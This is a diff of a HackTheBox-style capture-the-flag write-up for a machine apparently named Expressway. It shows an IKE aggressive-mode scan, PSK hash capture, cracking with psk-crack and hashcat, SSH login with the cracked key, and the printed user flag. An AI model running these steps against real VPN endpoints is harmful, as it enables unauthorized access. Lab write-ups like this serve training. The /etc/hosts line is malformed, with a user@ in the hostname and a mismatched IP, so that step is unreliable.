@@ -58,7 +58,7 @@ I run an **ike-scan** in aggressive mode:
 sudo ike-scan -A 10.129.8.198
 ```
 
-![Filtered output](images/ikescan1.PNG)
+![Filtered output](images/ike-scan1.PNG)
 
 The scan reveals some interesting information:
 
@@ -73,7 +73,11 @@ By including the **--pskcrack** flag the raw PSK can be written to file and used
 sudo ike-scan -A --pskcrack=ike_hash.txt 10.129.8.198
 ```
 
-Crack hash:
+The next step is to attempt to crack the hash with the **psk-crack** tool. I will utilize a wordlist called **rockyou.txt**. The wordlist is available in **Gzip** format on all HTB machines. You need to decompress the file before use:
+
+```
+gzip -d /usr/share/wordlists/rockyou.txt.gz
+```
 
 ```
 psk-crack ike_hash.txt -d /usr/share/wordlists/rockyou.txt
@@ -83,8 +87,55 @@ psk-crack ike_hash.txt -d /usr/share/wordlists/rockyou.txt
 
 The hash was succesfully cracked! 
 
+You don't have to use **psk-crack**, you can just as well use **hashcat** or **JohnTheRipper**. To crack the hash with **hashcat** use mode 5400 (IKE-PSK SHA1).
+
+```
+hashcat -a 0 -m 5400 ike_hash.txt /usr/share/wordlists/rockyou.txt
+```
+
+![Filtered output](images/ike-scan2)
+
 Below is a short summary of obtained information about the target:
 
+- IP: 10.129.8.198
 - ID: ike@expressway.htb
 - PSK: freakingrockstarontheroad
-- IP: 10.129.8.198
+
+The next step is figuring out how to utilize the information obtained in order to connect to the target. 
+
+Let's start of with a simple SSH connection to **ike@expressway.htb**:
+
+```
+ssh ike@expressway.htb
+```
+
+![Filtered output](images/ssh-1)
+
+It did not work because we have not added the hostname to the **/etc/hosts** file. Add the hostname and try again:
+
+```
+echo "10.129.12.184 ike@expressway.htb" >> /etc/hosts
+```
+
+```
+ssh ike@expressway.htb
+```
+
+We have gained access to the system!
+
+![Filtered output](images/ssh-2)
+
+The first flag is located in the users home directory in a file called **user.txt**:
+
+```
+cat user.txt
+```
+
+Flag:
+
+```
+6e42b743d77c11b2093c7b7d9d50be82
+```
+![Filtered output](images/userflag)
+
+
